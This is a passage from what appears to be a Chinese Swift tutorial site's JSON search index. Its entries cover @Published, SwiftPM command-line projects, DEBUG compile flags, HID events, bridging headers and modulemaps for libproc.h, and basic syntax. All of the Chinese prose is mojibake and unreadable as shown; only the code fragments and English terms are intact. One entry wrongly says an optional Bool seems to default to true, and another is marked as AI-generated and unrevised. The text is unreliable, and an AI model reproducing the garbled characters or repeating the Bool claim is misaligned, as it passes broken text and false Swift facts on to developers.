ä»¥ä¾¿è§†å›¾å¯ä»¥è§‚å¯Ÿå¤–éƒ¨å¯¹è±¡çš„çŠ¶æ€ï¼Œå¹¶åœ¨é‡è¦å†…å®¹å‘ç”Ÿå˜åŒ–æ—¶æ”¶åˆ°é€šçŸ¥ã€‚ @Published å…è®¸æˆ‘ä»¬åˆ›å»ºå¯è§‚å¯Ÿçš„å¯¹è±¡ï¼Œå¹¶ä¸”åœ¨å‘ç”Ÿæ›´æ”¹æ—¶è§¦å‘è§†å›¾é‡ç»˜ã€‚æˆ‘ä»¬ç»å¸¸å°†@Publishedä¸ObservableObjectåè®®ç»“åˆä½¿ç”¨ã€‚ æ­¤éƒ¨åˆ†å¯å‚è€ƒ: https://juejin.cn/post/7319706549915156499","tags":"åç«¯; swift","url":"/yq-backend-swift-course-attribute-wrapper.html","loc":"/yq-backend-swift-course-attribute-wrapper.html"},{"title":"swift-å‘½ä»¤è¡Œ-åˆ›å»ºå¹¶è¿è¡Œé¡¹ç›®","text":"å®˜ç½‘: https://www.swift.org/getting-started/cli-swiftpm/ å¹³å°: MacOS ä»¥åˆ›å»ºä¸€ä¸ª Hello World ä½œä¸ºè¯´æ˜ é¡¹ç›®åˆ›å»ºä¸è¿è¡Œ åˆ›å»ºé¡¹ç›®: $ mkdir MyCLI $ cd MyCLI $ swift package init --name MyCLI --type executable ç”Ÿæˆä»¥ä¸‹ç»“æ„ç›®å½•æ–‡ä»¶: . â”œâ”€â”€ Package.swift â””â”€â”€ Sources â””â”€â”€ main.swift æ‰§è¡Œç¨‹åº: $ swift run MyCLI Building for debugging... [3/3] Linking MyCLI Build complete! (0.68s) Hello, world!","tags":"åç«¯; swift","url":"/yq-backend-swift-course-create-pro.html","loc":"/yq-backend-swift-course-create-pro.html"},{"title":"DEBUGæ¡ä»¶","text":"ç”¨äºè®¾ç½®å¦‚æœæ˜¯å¼€å‘(DEBUG)ä¸­è¯¥åšä»€ä¹ˆ, æ­£å¼ç¯å¢ƒè¯¥åšä»€ä¹ˆ, å¦‚: #if DEBUG print(\"å¯èƒ½æ²¡æœ‰è·å–åˆ°è¾…åŠ©æƒé™, ç¡®è®¤åè¯·æ¸…ç†åæ‰‹åŠ¨è·å–\") #else // æ‰“å¼€è¯·æ±‚è¾…åŠ©æƒé™çª—å£ let _ = NoAccessView().openInWindow(title: \"è¯·æ±‚æˆæƒ\", sender: self) #endif å¦‚ä½•é…ç½®? æ‰“å¼€, ç¨‹åºé…ç½®é¡µé¢, é€‰æ‹© Build Settings , ç„¶åå¯ä»¥åœ¨ Filter ä¸­ æœç´¢ Custom Flags å¦‚å›¾æ‰€ç¤º, è¿˜éœ€åœ¨ Other Swift Flags ä¸­ è®¾ç½® Debug æ·»åŠ  -D DEBUG , æ³¨æ„ä¸è¦å’ŒReleaseä¸€èµ·æ·»åŠ ","tags":"åç«¯; swift","url":"/yq-backend-swift-course-debug.html","loc":"/yq-backend-swift-course-debug.html"},{"title":"äº‹ä»¶ç±»å‹","text":"HID äº‹ä»¶å’Œä¼šè¯äº‹ä»¶ HID äº‹ä»¶ï¼ˆHuman Interface Device Eventsï¼‰ HID äº‹ä»¶æ˜¯æŒ‡ç”±äººæœºäº¤äº’è®¾å¤‡ï¼ˆå¦‚é”®ç›˜ã€é¼ æ ‡ã€è§¦æ‘¸æ¿ç­‰ï¼‰äº§ç”Ÿçš„äº‹ä»¶ã€‚ ç”¨é€”ï¼šé€šè¿‡æˆªå– HID äº‹ä»¶ï¼Œä½ å¯ä»¥ç›‘è§†å’Œå“åº”ç”¨æˆ·ä¸è¾“å…¥è®¾å¤‡çš„äº¤äº’ï¼Œä¾‹å¦‚æŒ‰é”®ã€ç‚¹å‡»ã€æ»šåŠ¨ç­‰æ“ä½œã€‚ ä¼šè¯äº‹ä»¶ï¼ˆSession Eventsï¼‰ï¼š ä¼šè¯äº‹ä»¶æ˜¯æŒ‡ä¸ç”¨æˆ·ç™»å½•ä¼šè¯ï¼ˆsessionï¼‰ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ç”¨æˆ·ç™»å½•ã€æ³¨é”€ã€å±å¹•é”å®šç­‰ã€‚ ç”¨é€”ï¼šä¼šè¯äº‹ä»¶ä¸»è¦ç”¨äºç›‘è§†å’Œå“åº”ç”¨æˆ·ç™»å½•å’Œæ³¨é”€ç­‰ä¼šè¯çº§åˆ«çš„æ“ä½œï¼Œä»¥ä¾¿æ‰§è¡Œä¸ä¼šè¯çŠ¶æ€ç›¸å…³çš„ä»»åŠ¡æˆ–é€»è¾‘ã€‚ åŒºåˆ«ï¼š HID äº‹ä»¶æ˜¯ä¸äººæœºäº¤äº’è®¾å¤‡ï¼ˆè¾“å…¥è®¾å¤‡ï¼‰ç›¸å…³çš„äº‹ä»¶ï¼Œè€Œä¼šè¯äº‹ä»¶æ˜¯ä¸ç”¨æˆ·ç™»å½•ä¼šè¯ï¼ˆsessionï¼‰ç›¸å…³çš„äº‹ä»¶ã€‚ HID äº‹ä»¶æ˜¯é’ˆå¯¹ç”¨æˆ·è¾“å…¥çš„å“åº”ï¼Œè€Œä¼šè¯äº‹ä»¶æ˜¯é’ˆå¯¹ç”¨æˆ·ç™»å½•å’Œæ³¨é”€ç­‰ä¼šè¯çº§åˆ«çš„æ“ä½œçš„å“åº”ã€‚ HID äº‹ä»¶å¯ä»¥æˆªå–å’Œå¤„ç†ï¼Œä»¥å®ç°è‡ªå®šä¹‰çš„äº¤äº’é€»è¾‘ï¼Œè€Œä¼šè¯äº‹ä»¶é€šå¸¸ç”±ç³»ç»Ÿæˆ–æ¡†æ¶å¤„ç†ã€‚","tags":"åç«¯; swift","url":"/yq-backend-swift-course-event-type.html","loc":"/yq-backend-swift-course-event-type.html"},{"title":"æ¡¥æ¥å¯¼å…¥C","text":"æ³¨è§£ æºäºAI, æœ‰ç©ºæ•´ç† å¦‚æœä½ åœ¨ Swift ä¸­ä½¿ç”¨æ¡¥æ¥å¤´æ–‡ä»¶æ¥è®¿é—® C å¤´æ–‡ä»¶ä¸­çš„å®å®šä¹‰ï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š åˆ›å»ºæ¡¥æ¥å¤´æ–‡ä»¶ åœ¨ Xcode ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„å¤´æ–‡ä»¶ï¼ˆä¾‹å¦‚ YourProject-Bridging-Header.hï¼‰ã€‚ åœ¨æ¡¥æ¥å¤´æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨ #import æˆ– #include å¯¼å…¥ libproc.h å¤´æ–‡ä»¶: #import <libproc.h> é…ç½®æ¡¥æ¥å¤´æ–‡ä»¶ï¼š åœ¨ Xcode é¡¹ç›®çš„ \"Build Settings\"ï¼ˆæ„å»ºè®¾ç½®ï¼‰ä¸­ï¼Œ æ‰¾åˆ° \"Objective-C Bridging Header\"ï¼ˆObjective-C æ¡¥æ¥å¤´æ–‡ä»¶ï¼‰è®¾ç½®ã€‚ å°†è®¾ç½®çš„å€¼æŒ‡å®šä¸ºæ¡¥æ¥å¤´æ–‡ä»¶çš„è·¯å¾„ï¼Œä¾‹å¦‚ YourProject/YourProject-Bridging-Header.hã€‚ åœ¨ Swift ä»£ç ä¸­ä½¿ç”¨å®å®šä¹‰ åœ¨ Swift æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡æ¡¥æ¥å¤´æ–‡ä»¶æ¥è®¿é—® libproc.h ä¸­çš„å®å®šä¹‰ã€‚ ä½¿ç”¨ #if é¢„å¤„ç†æŒ‡ä»¤æ¥æ£€æŸ¥å®å®šä¹‰çš„å€¼ï¼Œå¹¶åœ¨ä»£ç ä¸­åšå‡ºç›¸åº”çš„å¤„ç†: #if YOUR_MACRO // å®å®šä¹‰å­˜åœ¨æ—¶çš„å¤„ç†é€»è¾‘ #else // å®å®šä¹‰ä¸å­˜åœ¨æ—¶çš„å¤„ç†é€»è¾‘ #endif è¯·æ³¨æ„ï¼ŒSwift æ˜¯ä¸€ç§ä¸åŒäº C çš„è¯­è¨€ï¼Œå› æ­¤åœ¨ Swift æ–‡ä»¶ä¸­æ— æ³•ç›´æ¥è®¿é—® C å¤´æ–‡ä»¶ä¸­çš„å®å®šä¹‰ã€‚ é€šè¿‡æ¡¥æ¥å¤´æ–‡ä»¶ï¼Œä½ å¯ä»¥åœ¨ Objective-C å’Œ Swift ä¹‹é—´å»ºç«‹è¿æ¥ï¼Œä»è€Œä½¿ Swift ä»£ç èƒ½å¤Ÿè®¿é—® C å¤´æ–‡ä»¶ä¸­çš„å®å®šä¹‰å’Œå…¶ä»–å†…å®¹ã€‚ ç¡®ä¿åœ¨æ¡¥æ¥å¤´æ–‡ä»¶å’Œ Swift æ–‡ä»¶ä¹‹é—´è®¾ç½®äº†æ­£ç¡®çš„è·¯å¾„å’Œé…ç½®ï¼Œä»¥ä¾¿èƒ½å¤ŸæˆåŠŸè®¿é—® libproc.h ä¸­çš„å®å®šä¹‰","tags":"åç«¯; swift","url":"/yq-backend-swift-course-import-c.html","loc":"/yq-backend-swift-course-import-c.html"},{"title":"ä½¿ç”¨modulemapå¯¼å…¥C++æ¡†æ¶","text":"è‡ªå·±ä½¿ç”¨modulemapåªå¯¼å…¥æŸä¸€ä¸ªå¤´æ–‡ä»¶, æ–‡ä»¶æ˜¯ä½äºSDKåº“çš„ libproc.h , å¥ˆä½•ä¸€ç›´å¤±è´¥, æ•…æ”¾å¼ƒ.... è´´ä¸€äº›ç›¸å…³çš„èµ„æ–™: Importing Headers from a C++ Package Target Mixing Languages in an Xcode project Importing C++ into Swift åæ­£æ˜¯çœ‹äº†ä¸€åœˆ, å¥½åƒæ²¡ç›´æ¥æ”¯æŒçš„, å¦‚æœè¦æ‹¿å‡ºæ¥å¼„æˆtargetæˆ–è€…æ¡†æ¶å•¥çš„, å°±å¥½éº»çƒ¦, æ¯•ç«Ÿåªéœ€è¦å¯¼é‚£ä¸€ä¸ª..., æš‚æ—¶å…ˆæ¡¥æ¥å¤„ç†å§ ä½¿ç”¨modulemap å¤§è‡´ä¸¤æ­¥æµç¨‹ ç¼–å†™ modulemap æ–‡ä»¶, å‘½åä¸º module.modulemap (åœ¨xcodeæ–°å»ºä¼šè‡ªå¸¦åç¼€) åœ¨ TARGETS ä¸‹é…ç½® Swift Compiler - Search Paths ä¸ºmodulemapæ–‡ä»¶æ‰€åœ¨ç›®å½• è¯¦ç»†è¯´æ˜ modulemap ä¸æ­¢å¯ä»¥ä½¿ç”¨åœ¨ C++, ä¹Ÿå¯ä»¥æ˜¯C, ä¹Ÿä¸æ­¢æ˜¯åŒ…å’Œæ¡†æ¶, è¿˜å¯ä»¥ç›´æ¥åœ¨å½“å‰é¡¹ç›®å†…ç›´æ¥æ–°æ‹‰ä¸€ä¸ªç»„ç”¨, ä½†æ˜¯æœ€é‡è¦çš„ä¸€ç‚¹, æ–‡ä»¶ååªèƒ½å®šä¹‰ä¸º `module` å¦å¤–éœ€é…ç½® Swift Compiler - Search Paths ä¸ºmodulemapæ–‡ä»¶æ‰€åœ¨ç›®å½•, ä»¥æ ¹ç›®å½•ä¸‹ Modules/module.modulemap ä¸ºä¾‹ (ä¸”ä¸€å®šè¦é€‰ TARGETS è€Œä¸æ˜¯ PROJECT ): $(SRCROOT)/Modules é‡è¦ modulemapæ–‡ä»¶ååªèƒ½å« module module.modulemapå†…å®¹ç¤ºä¾‹: module ProcInfo { header \"tt.h\" export * } å…¶ä»–è¯´æ˜ æœ‰ä¸ªæ–°çš„é—®é¢˜, å°±æ˜¯åœ¨è‡ªå®šä¹‰çš„å¤´æ–‡ä»¶, æ— æ³•å¯¼å…¥å…¶ä»–å¤´æ–‡ä»¶å¹¶æ­£å¸¸ä½¿ç”¨, ä»¥å¯¼å…¥SDKåº“çš„libprocä¸ºä¾‹: // tt.h #ifndef tt_h #define tt_h //#include <libproc.h> //#import <libproc.h> #import </Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk/usr/include/libproc.h> // ä¸çŸ¥é“ä¸ºå•¥, å°±æ˜¯æ‰¾ä¸åˆ°sdkåŒ…é‡Œé¢çš„ libproc... #define NAME \"YQ\" #define NAME2 \"YQ\" #define PROC_PIDPATHINFO_MAXSIZE PROC_PIDPATHINFO_MAXSIZE #define PROC_Q_MAXSIZE PROC_PIDPATHINFO_MAXSIZE #define SIZEYQ \"PROC_PIDPATHINFO_MAXSIZE\" #endif /* tt_h */ ä¸ç®¡ import æ€ä¹ˆå†™, ä¸ç®¡åœ¨ header pathæ€ä¹ˆè®¾ç½®, å“ªæ€•æ˜¯ç›´æ¥å¯¼å…¥ç»å¯¹è·¯å¾„, cmd + click éƒ½æ‰¾ä¸åˆ°... æœ€åå°è¯•äº†ä¸€ä¸‹åœ¨swiftä¸­ä½¿ç”¨, å‘ç°ä¸€ä¸ªé—®é¢˜, å°±æ˜¯è™½ç„¶å¤´æ–‡ä»¶ä¸­æ²¡å‘ç›´æ¥æŒ‰ä½Commandé”®å¹¶å•å‡»æ¥å¯¼èˆªåˆ°å¯¼å…¥çš„å¤´æ–‡ä»¶, ä½†æ˜¯ä»£ç ä¸­å¯ä»¥æ‹¿åˆ°éƒ¨åˆ†å€¼ æ³¨è§£ æ— æ³•é€šè¿‡ æŒ‰ä½Commandé”®å¹¶å•å‡»æ¥ è‡ªå®šä¹‰å¤´æ–‡ä»¶ä¸­å¼•å…¥çš„å¤´æ–‡ä»¶æ¥ç¡®å®šæ˜¯å¦æˆåŠŸå¯¼å…¥, è²Œä¼¼æ ¹æœ¬æ²¡å‘åœ¨é¡¹ç›®æ”¯æŒ.","tags":"åç«¯; swift","url":"/yq-backend-swift-course-import-cframe.html","loc":"/yq-backend-swift-course-import-cframe.html"},{"title":"åŸºæœ¬è¯­æ³•","text":"å¸¸è¯†äº†è§£ Swift Playground å¯è§†ä¸ºä¸€ä¸ªå¯äº¤äº’çš„æ–‡æ¡£ï¼Œ æ‰€å†™å³æ‰€å¾— å†…ç½®å…³é”®å­— let å¸¸é‡å®šä¹‰ var å˜é‡å®šä¹‰ print æ‰“å°è¾“å‡º typealias å®šä¹‰ç±»å‹åˆ«å å¦‚å®šä¹‰äº† Int çš„ç±»å‹åˆ«åä¸º Feet: typealias Feet = Int guard guardè¯­å¥å’Œifè¯­å¥æœ‰ç‚¹ç±»ä¼¼ï¼Œéƒ½æ˜¯æ ¹æ®å…¶å…³é”®å­—ä¹‹åçš„è¡¨è¾¾å¼çš„å¸ƒå°”å€¼å†³å®šä¸‹ä¸€æ­¥æ‰§è¡Œä»€ä¹ˆã€‚ ä½†ä¸ifè¯­å¥ä¸åŒçš„æ˜¯ï¼Œguardè¯­å¥åªä¼šæœ‰ä¸€ä¸ªä»£ç å—ï¼Œä¸åƒifè¯­å¥å¯ä»¥if elseå¤šä¸ªä»£ç å—ã€‚ é‚£ä¹ˆguardè¯­å¥çš„ä½œç”¨åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å®ˆæŠ¤ã€‚ guardè¯­å¥åˆ¤æ–­å…¶åçš„è¡¨è¾¾å¼å¸ƒå°”å€¼ä¸ºfalseæ—¶ï¼Œæ‰ä¼šæ‰§è¡Œä¹‹åä»£ç å—é‡Œçš„ä»£ç ï¼Œ å¦‚æœä¸ºtrueï¼Œåˆ™è·³è¿‡æ•´ä¸ªguardè¯­å¥: // æ£€æŸ¥èº«ä»½è¯ï¼Œå¦‚æœèº«ä»½è¯æ²¡å¸¦ï¼Œåˆ™ä¸èƒ½è¿›å…¥è€ƒåœº guard let id = person[\"id\"] else { print(\"æ²¡æœ‰èº«ä»½è¯ï¼Œä¸èƒ½è¿›å…¥è€ƒåœº!\") return } å†…ç½®æ•°æ®ç±»å‹ Int æ•´å‹ UInt æ— ç¬¦å·æ•´å‹ å°½é‡ä¸è¦ä½¿ç”¨UIntï¼Œé™¤éä½ çœŸçš„éœ€è¦å­˜å‚¨ä¸€ä¸ªå’Œå½“å‰å¹³å°åŸç”Ÿå­—é•¿ç›¸åŒçš„æ— ç¬¦å·æ•´æ•°ã€‚ é™¤äº†è¿™ç§æƒ…å†µï¼Œæœ€å¥½ä½¿ç”¨Intï¼Œå³ä½¿ä½ è¦å­˜å‚¨çš„å€¼å·²çŸ¥æ˜¯éè´Ÿçš„ã€‚ ç»Ÿä¸€ä½¿ç”¨Intå¯ä»¥æé«˜ä»£ç çš„å¯å¤ç”¨æ€§ï¼Œé¿å…ä¸åŒç±»å‹æ•°å­—ä¹‹é—´çš„è½¬æ¢ï¼Œå¹¶ä¸”åŒ¹é…æ•°å­—çš„ç±»å‹æ¨æ–­ã€‚ æ³¨è§£ æ•´æ•°ç±»å‹éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åœ¨ 32 ä½ç³»ç»Ÿä¸Š, Int å’Œ Int32 é•¿åº¦ç›¸åŒã€‚ åœ¨ 64 ä½ç³»ç»Ÿä¸Š, Int å’Œ Int64 é•¿åº¦ç›¸åŒã€‚ åœ¨ 32 ä½ç³»ç»Ÿä¸Š, UInt å’Œ UInt32 é•¿åº¦ç›¸åŒã€‚ åœ¨ 64 ä½ç³»ç»Ÿä¸Š, UInt å’Œ UInt64 é•¿åº¦ç›¸åŒã€‚ Int8, Int16, Int32, Int64 åˆ†åˆ«è¡¨ç¤º 8 ä½, 16 ä½, 32 ä½, å’Œ 64 ä½çš„æœ‰ç¬¦å·æ•´æ•°å½¢å¼ã€‚ UInt8, UInt16, UInt32, UInt64 åˆ†åˆ«è¡¨ç¤º 8 ä½, 16 ä½, 32 ä½ å’Œ 64 ä½çš„æ— ç¬¦å·æ•´æ•°å½¢å¼ã€‚ Float 32æµ®ç‚¹æ•°ï¼Œç²¾åº¦è¦æ±‚ä¸é«˜çš„è¯å¯ä»¥ä½¿ç”¨æ­¤ç±»å‹ã€‚ æµ®ç‚¹ç±»å‹æ¯”æ•´æ•°ç±»å‹è¡¨ç¤ºçš„èŒƒå›´æ›´å¤§ï¼Œå¯ä»¥å­˜å‚¨æ¯” Int ç±»å‹æ›´å¤§æˆ–è€…æ›´å°çš„æ•°å­— Double 64ä½æµ®ç‚¹æ•°ï¼Œå½“ä½ éœ€è¦å­˜å‚¨å¾ˆå¤§æˆ–è€…å¾ˆé«˜ç²¾åº¦çš„æµ®ç‚¹æ•°æ—¶è¯·ä½¿ç”¨æ­¤ç±»å‹ã€‚ æ³¨è§£ Doubleç²¾ç¡®åº¦å¾ˆé«˜ï¼Œè‡³å°‘æœ‰15ä½æ•°å­—ï¼Œ è€Œ Float æœ€å°‘åªæœ‰6ä½æ•°å­—ã€‚ é€‰æ‹©å“ªä¸ªç±»å‹å–å†³äºä½ çš„ä»£ç éœ€è¦å¤„ç†çš„å€¼çš„èŒƒå›´ã€‚ Bool å¸ƒå°”å€¼ åŸºæœ¬çš„å¸ƒå°”ï¼ˆBooleanï¼‰ç±»å‹ï¼Œå«åš Boolã€‚å¸ƒå°”å€¼æŒ‡é€»è¾‘ä¸Šçš„å€¼ï¼Œå› ä¸ºå®ƒä»¬åªèƒ½æ˜¯çœŸæˆ–è€…å‡ã€‚ Swift æœ‰ä¸¤ä¸ªå¸ƒå°”å¸¸é‡ï¼Œtrue å’Œ falseã€‚ String å­—ç¬¦ä¸²æ˜¯å­—ç¬¦çš„åºåˆ—é›†åˆ Character å­—ç¬¦æŒ‡çš„æ˜¯å•ä¸ªå­—æ¯ Optional ä½¿ç”¨å¯é€‰ç±»å‹æ¥å¤„ç†å€¼å¯èƒ½ç¼ºå¤±çš„æƒ…å†µã€‚å¯é€‰ç±»å‹è¡¨ç¤ºæœ‰å€¼æˆ–æ²¡æœ‰å€¼ã€‚ å¦‚ä»¥ä¸‹ä¸¤ç§å£°æ˜ç›¸ç­‰: var optionalInteger: Int? var optionalInteger: Optional<Int> å½“ä½ å£°æ˜ä¸€ä¸ªå¯é€‰å˜é‡æˆ–è€…å¯é€‰å±æ€§çš„æ—¶å€™æ²¡æœ‰æä¾›åˆå§‹å€¼ï¼Œå®ƒçš„å€¼ä¼šé»˜è®¤ä¸º nil è‹¥ä¸ºå¸ƒå°”ï¼Œ è²Œä¼¼é»˜è®¤ä¸ºtrue å¦‚æœä¸€ä¸ªå¯é€‰ç±»å‹çš„å®ä¾‹åŒ…å«ä¸€ä¸ªå€¼ï¼Œä½ å¯ä»¥ç”¨åç¼€æ“ä½œç¬¦ ï¼æ¥è®¿é—®è¿™ä¸ªå€¼: optionalInteger = 42 optionalInteger! // 42 å½“ä½ ç¡®å®šå¯é€‰ç±»å‹ç¡®å®åŒ…å«å€¼ä¹‹åï¼Œä½ å¯ä»¥åœ¨å¯é€‰çš„åå­—åé¢åŠ ä¸€ä¸ªæ„Ÿå¹å·ï¼ˆ!ï¼‰æ¥è·å–å€¼ï¼Œ è¿™è¢«ç§°ä¸ºå¯é€‰å€¼çš„ å¼ºåˆ¶è§£æï¼ˆforced unwrappingï¼‰ è¿™éƒ¨åˆ†(é—®å·/å¹å·)çš„ä½¿ç”¨, ä¸tsåŸºæœ¬ä¸€è‡´ æ³¨è§£ ä½¿ç”¨!æ¥è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„å¯é€‰å€¼ä¼šå¯¼è‡´è¿è¡Œæ—¶é”™è¯¯ã€‚ ä½¿ç”¨!æ¥å¼ºåˆ¶è§£æå€¼ä¹‹å‰ï¼Œä¸€å®šè¦ç¡®å®šå¯é€‰åŒ…å«ä¸€ä¸ªénilçš„å€¼ã€‚ å¯é€‰ç»‘å®š ä½¿ç”¨å¯é€‰ç»‘å®šï¼ˆoptional bindingï¼‰æ¥åˆ¤æ–­å¯é€‰ç±»å‹æ˜¯å¦åŒ…å«å€¼ï¼Œ å¦‚æœåŒ…å«å°±æŠŠå€¼èµ‹ç»™ä¸€ä¸ªä¸´æ—¶å¸¸é‡æˆ–è€…å˜é‡ã€‚ å¯é€‰ç»‘å®šå¯ä»¥ç”¨åœ¨ifå’Œwhileè¯­å¥ä¸­æ¥å¯¹å¯é€‰ç±»å‹çš„å€¼è¿›è¡Œåˆ¤æ–­å¹¶æŠŠå€¼èµ‹ç»™ä¸€ä¸ªå¸¸é‡æˆ–è€…å˜é‡ã€‚ å®ä¾‹: import Cocoa var myString:String? myString = \"Hello, Swift!\" if let yourString = myString { print(\"ä½ çš„å­—ç¬¦ä¸²å€¼ä¸º - \\(yourString)\") }else{ print(\"ä½ çš„å­—ç¬¦ä¸²æ²¡æœ‰å€¼\") } ä»¥ä¸Šç¨‹åºæ‰§è¡Œç»“æœä¸º: ä½ çš„å­—ç¬¦ä¸²å€¼ä¸º - Hello, Swift! Array todo Dictionary todo Struct todo Class todo ç±»å‹å®‰å…¨ Swift æ˜¯ä¸€ä¸ªç±»å‹å®‰å…¨ï¼ˆtype safeï¼‰çš„è¯­è¨€ã€‚ ç”±äº Swift æ˜¯ç±»å‹å®‰å…¨çš„ï¼Œ æ‰€ä»¥å®ƒä¼šåœ¨ç¼–è¯‘ä½ çš„ä»£ç æ—¶è¿›è¡Œç±»å‹æ£€æŸ¥ï¼ˆtype checksï¼‰ï¼Œå¹¶æŠŠä¸åŒ¹é…çš„ç±»å‹æ ‡è®°ä¸ºé”™è¯¯ã€‚ è¿™å¯ä»¥è®©ä½ åœ¨å¼€å‘çš„æ—¶å€™å°½æ—©å‘ç°å¹¶ä¿®å¤é”™è¯¯ã€‚ ç±»å‹æ¨æ–­ ä¸éœ€è¦æ¯æ¬¡å£°æ˜å¸¸é‡å’Œå˜é‡çš„æ—¶å€™éƒ½æ˜¾å¼æŒ‡å®šç±»å‹ å¦‚æœä½ æ²¡æœ‰æ˜¾å¼æŒ‡å®šç±»å‹ï¼ŒSwift ä¼šä½¿ç”¨ç±»å‹æ¨æ–­ï¼ˆtype inferenceï¼‰æ¥é€‰æ‹©åˆé€‚çš„ç±»å‹ã€‚ å½“æ¨æ–­æµ®ç‚¹æ•°çš„ç±»å‹æ—¶ï¼ŒSwift æ€»æ˜¯ä¼šé€‰æ‹©Doubleè€Œä¸æ˜¯Floatã€‚ å¦‚æœè¡¨è¾¾å¼ä¸­åŒæ—¶å‡ºç°äº†æ•´æ•°å’Œæµ®ç‚¹æ•°ï¼Œä¼šè¢«æ¨æ–­ä¸ºDoubleç±»å‹ Swift å˜é‡ å˜é‡æ˜¯ä¸€ç§ä½¿ç”¨æ–¹ä¾¿çš„å ä½ç¬¦ï¼Œç”¨äºå¼•ç”¨è®¡ç®—æœºå†…å­˜åœ°å€ã€‚ å£°æ˜: var variableName = <initial value> var varB:Float å˜é‡åå¯ä»¥ç”±å­—æ¯ï¼Œæ•°å­—å’Œä¸‹åˆ’çº¿ç»„æˆ å˜é‡åéœ€è¦ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å§‹ åŒºåˆ†å¤§å°å†™ Swift å¸¸é‡ è®¾å®šåä¸å¯å˜ å£°æ˜å¸¸é‡æˆ–è€…å˜é‡çš„æ—¶å€™å¯ä»¥åŠ ä¸Šç±»å‹æ ‡æ³¨ï¼ˆtype annotationï¼‰ï¼Œ è¯´æ˜å¸¸é‡æˆ–è€…å˜é‡ä¸­è¦å­˜å‚¨çš„å€¼çš„ç±»å‹: var constantName:<data type> = <optional initial value> Swift è¿ç®—ç¬¦ ç®—æœ¯è¿ç®—ç¬¦ + - * / % , åˆ†åˆ«è¡¨ç¤º åŠ  å‡ ä¹˜ é™¤ æ±‚ä½™ æ¯”è¾ƒè¿ç®—ç¬¦ == ç­‰äº != ä¸ç­‰äº > å¤§äº < å°äº >= å¤§äºç­‰äº <= å°äºç­‰äº é€»è¾‘è¿ç®—ç¬¦ && é€»è¾‘ä¸ã€‚å¦‚æœè¿ç®—ç¬¦ä¸¤ä¾§éƒ½ä¸º TRUE åˆ™ä¸º TRUEã€‚ || é€»è¾‘æˆ–ã€‚ å¦‚æœè¿ç®—ç¬¦ä¸¤ä¾§è‡³å°‘æœ‰ä¸€ä¸ªä¸º TRUE åˆ™ä¸º TRUEã€‚ ! é€»è¾‘éã€‚å¸ƒå°”å€¼å–åï¼Œä½¿å¾—trueå˜falseï¼Œfalseå˜trueã€‚ ä½è¿ç®—ç¬¦ ä½è¿ç®—ç¬¦ç”¨æ¥å¯¹äºŒè¿›åˆ¶ä½è¿›è¡Œæ“ä½œï¼Œ ~ & | &#94; << >> åˆ†åˆ«ä¸ºå–åï¼ŒæŒ‰ä½ä¸ä¸ï¼ŒæŒ‰ä½ä¸æˆ–ï¼ŒæŒ‰ä½ä¸å¼‚æˆ–è¿ç®—, æŒ‰ä½å·¦ç§»ï¼Œ æŒ‰ä½å³ç§» èµ‹å€¼è¿ç®—ç¬¦ = ç®€å•çš„èµ‹å€¼è¿ç®—ï¼ŒæŒ‡å®šå³è¾¹æ“ä½œæ•°èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•° += ç›¸åŠ åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°ç›¸åŠ åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•°ã€‚ -= ç›¸å‡åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°ç›¸å‡åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•°ã€‚ *= ç›¸ä¹˜åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°ç›¸ä¹˜åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•°ã€‚ /= ç›¸é™¤åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°ç›¸é™¤åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•° %= æ±‚ä½™åå†èµ‹å€¼ï¼Œå°†å·¦å³ä¸¤è¾¹çš„æ“ä½œæ•°æ±‚ä½™åå†èµ‹å€¼ç»™å·¦è¾¹çš„æ“ä½œæ•° <<= æŒ‰ä½å·¦ç§»åå†èµ‹å€¼ >>= æŒ‰ä½å³ç§»åå†èµ‹å€¼ &= æŒ‰ä½ä¸è¿ç®—åèµ‹å€¼ &#94;= æŒ‰ä½å¼‚æˆ–è¿ç®—ç¬¦åå†èµ‹å€¼ |= æŒ‰ä½æˆ–è¿ç®—åå†èµ‹å€¼ åŒºé—´è¿ç®—ç¬¦ é—­åŒºé—´è¿ç®—ç¬¦: é—­åŒºé—´è¿ç®—ç¬¦ ï¼ˆa...bï¼‰ å®šä¹‰ä¸€ä¸ªåŒ…å«ä»aåˆ°b(åŒ…æ‹¬aå’Œb)çš„æ‰€æœ‰å€¼çš„åŒºé—´, å¿…é¡»å¤§äºç­‰äºaã€‚ é—­åŒºé—´è¿ç®—ç¬¦åœ¨è¿­ä»£ä¸€ä¸ªåŒºé—´çš„æ‰€æœ‰å€¼æ—¶æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œ å¦‚åœ¨for-inå¾ªç¯ä¸­: 1...5 åŒºé—´å€¼ä¸º 1, 2, 3, 4 å’Œ 5 åŠå¼€åŒºé—´è¿ç®—ç¬¦ åŠå¼€åŒºé—´ï¼ˆa..<bï¼‰å®šä¹‰ä¸€ä¸ªä»aåˆ°bä½†ä¸åŒ…æ‹¬bçš„åŒºé—´ã€‚ ä¹‹æ‰€ä»¥ç§°ä¸ºåŠå¼€åŒºé—´ï¼Œ æ˜¯å› 